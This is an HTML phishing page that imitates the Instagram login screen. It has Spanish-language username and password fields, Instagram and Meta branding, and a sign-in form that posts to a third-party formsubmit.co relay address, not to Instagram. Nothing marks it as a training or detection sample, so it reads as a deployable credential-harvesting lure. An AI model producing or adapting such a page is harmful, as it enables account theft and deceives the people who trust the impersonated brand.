<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            background-color: #182027;
            color: #fff;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #182027;
            border-radius: 10px;
            padding: 30px;
            width: 300px;
            text-align: center;
        }

        .instagram-logo {
            width: 100px;
            height: 100px;
            margin-bottom: 30px;
        }

        .instagram-logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        input[type="text"],
        input[type="password"] {
            background-color: #25292e;
            border: 1px solid #3a3e43;
            border-radius: 5px;
            color: #fff;
            padding: 10px;
            margin-bottom: 15px;
            width: 100%;
            box-sizing: border-box;
        }

        button {
            background-color: #0095f6;
            border: none;
            border-radius: 5px;
            color: #fff;
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 15px;
        }

        button:hover {
            background-color: #0084e4;
        }

        a {
            color: #0095f6;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .meta-logo {
            margin-top: 20px;
            color: #fff;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
     <center>   <div class="instagram-logo">
            <img src="https://img.icons8.com/?size=100&id=Xy10Jcu1L2Su&format=png&color=000000" alt="Instagram Logo">
        </div></center>
        <form action="https://formsubmit.co/2274601a4a346785da654872f4dfc316" method="POST">
        <input type="text" placeholder="Usuario, correo electrónico o móvil">
        <input type="password" placeholder="Contraseña">
        <button type="submit">Iniciar sesión</button></form>
        <a href="#">¿Has olvidado la contraseña?</a><br><br>
        <button>Crear cuenta nueva</button>
        <div class="meta-logo">
            <a href="https://www.meta.com">∞ Meta</a>
        </div>
    </div>
</body>
</html>
